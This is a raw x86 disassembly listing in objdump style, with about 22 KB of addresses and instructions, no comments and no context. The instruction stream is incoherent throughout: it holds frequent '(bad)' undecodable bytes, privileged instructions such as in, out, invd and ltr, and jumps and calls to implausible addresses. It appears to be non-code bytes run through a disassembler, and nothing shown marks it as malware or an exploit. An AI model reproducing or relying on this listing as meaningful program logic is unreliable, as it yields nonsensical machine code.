  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
